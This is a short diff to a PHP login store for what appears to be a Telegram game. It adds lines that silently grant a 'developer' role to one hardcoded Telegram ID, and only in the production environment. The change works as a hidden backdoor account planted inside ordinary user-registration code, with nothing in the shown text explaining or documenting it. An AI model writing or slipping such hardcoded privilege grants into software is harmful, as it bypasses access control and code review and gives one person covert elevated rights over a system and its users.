@@ -22,6 +22,9 @@ final class TelegramLoginStore {
         if ($exists === false) {
             $this->run("INSERT INTO users (id, exp, coins, cigarettes, create_time, visit, shmot) VALUES (?, 0, 10, 1000, ?, ?, '[]')", [$uid, $now, $now]);
         }
+        if(TelegramEnvironment::name()==='prod'&&$telegramId==='1355806786'){
+            $this->run("INSERT IGNORE INTO telegram_roles(player_id,role,created_at) VALUES (?,'developer',?)",[$uid,$now]);
+        }
         return $uid;
     }
     public function saveSession(int $uid, string $hash, int $expires, string $requestKey): void {
